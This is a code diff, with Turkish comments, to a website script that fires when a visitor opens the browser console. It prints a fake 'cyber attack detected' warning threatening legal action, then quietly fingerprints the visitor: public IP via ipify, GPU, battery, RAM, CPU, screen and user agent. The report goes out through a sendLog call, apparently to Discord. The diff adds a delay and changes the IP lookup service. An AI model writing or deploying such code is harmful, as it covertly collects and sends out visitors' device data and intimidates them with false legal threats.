@@ -577,44 +577,42 @@
             if (intrusionLogged) return;
             intrusionLogged = true;
 
-            // Konsolu Temizle ve Mesajları Bas
-            console.clear();
-            console.log("%c ", "padding: 1px;");
-            console.log("%c SE7ENSYNDRAXE CYBER SECURITY DETECTED A CYBER ATTACK ", "color: #00FFFF; background: #000; border: 2px solid #00FFFF; font-weight: bold; font-size: 18px; padding: 10px;");
-            console.log("%c ", "padding: 1px;");
-            console.log("%c[SYSTEM]: Unauthorized access to console detected.", "color: #ff0000; font-size: 14px; font-weight: bold; margin-top: 10px;");
-            console.log("%c[REPORT]: IP adresin ve cihaz kimliğin yasal işlem için loglanmıştır.", "color: #ffffff; font-size: 14px; font-weight: bold;");
-            console.log("%c[REPORT]: Your IP address and device identity have been logged for legal action.", "color: #ffffff; font-size: 14px; font-weight: bold;");
+            // Konsol açılışında sayfa yenilense bile mesajın düzgün düşmesi için ufak bir gecikme ekliyoruz.
+            setTimeout(async () => {
+                console.clear();
+                console.log("%c ", "padding: 1px;");
+                console.log("%c SE7ENSYNDRAXE CYBER SECURITY DETECTED A CYBER ATTACK ", "color: #00FFFF; background: #000; border: 2px solid #00FFFF; font-weight: bold; font-size: 18px; padding: 10px;");
+                console.log("%c ", "padding: 1px;");
+                console.log("%c[SYSTEM]: Unauthorized access to console detected.", "color: #ff0000; font-size: 14px; font-weight: bold; margin-top: 10px;");
+                console.log("%c[REPORT]: IP adresin ve cihaz kimliğin yasal işlem için loglanmıştır.", "color: #ffffff; font-size: 14px; font-weight: bold;");
+                console.log("%c[REPORT]: Your IP address and device identity have been logged for legal action.", "color: #ffffff; font-size: 14px; font-weight: bold;");
 
-            try {
-                // Veri Toplama
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden/Unknown";
-                
-                let batteryLevel = "N/A";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    batteryLevel = `%${Math.round(b.level * 100)}`;
-                }
+                try {
+                    // ipapi rate limite takıldığı için stabil olan ipify kullanıyoruz
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden/Unknown";
+                    
+                    let batteryLevel = "N/A";
+                    if (navigator.getBattery) {
+                        const b = await navigator.getBattery();
+                        batteryLevel = `%${Math.round(b.level * 100)}`;
+                    }
 
-                // Rapor Oluşturma
-                const dataReport = `
+                    const dataReport = `
 **🚨 KRİTİK SIZMA ANALİZİ**
 -------------------------------------------
 **🌐 NETWORK INFO**
-**IP:** \`${ipData.ip}\`
-**Konum:** \`${ipData.city} / ${ipData.region} / ${ipData.country_name}\`
-**ISP:** \`${ipData.org}\`
+**IP:** \`${ipData.ip || 'Bilinmiyor'}\`
 
 **🖥️ HARDWARE INFO**
 **GPU:** \`${gpu}\`
 **RAM:** \`${navigator.deviceMemory || '8'}+ GB\`
-**CPU Cores:** \`${navigator.hardwareConcurrency}\`
+**CPU Cores:** \`${navigator.hardwareConcurrency || 'Bilinmiyor'}\`
 **Platform:** \`${navigator.platform}\`
 **Resolution:** \`${window.screen.width}x${window.screen.height}\`
 
@@ -623,11 +621,12 @@
 **User-Agent:** \`${navigator.userAgent.substring(0, 150)}...\`
 -------------------------------------------
 **🛑 EYLEM:** Konsol açıldı ve tüm veriler hukuki süreç için Discord'a mühürlendi.
-                `;
-                sendLog("🛑 FULL SYSTEM EXPLOIT", dataReport, 15158332);
-            } catch (err) {
-                sendLog("🚨 SIZMA TESPİT EDİLDİ", "Kullanıcı konsolu açtı ancak detaylar çekilemedi.", 15158332);
-            }
+                    `;
+                    sendLog("🛑 FULL SYSTEM EXPLOIT", dataReport, 15158332);
+                } catch (err) {
+                    sendLog("🚨 SIZMA TESPİT EDİLDİ", "Kullanıcı konsolu açtı ancak detaylar çekilemedi (Adblock veya Rate Limit).", 15158332);
+                }
+            }, 500); // 500ms gecikme (Konsol render olana kadar bekle)
         }
 
         // Konsol Açma Dinleyicileri
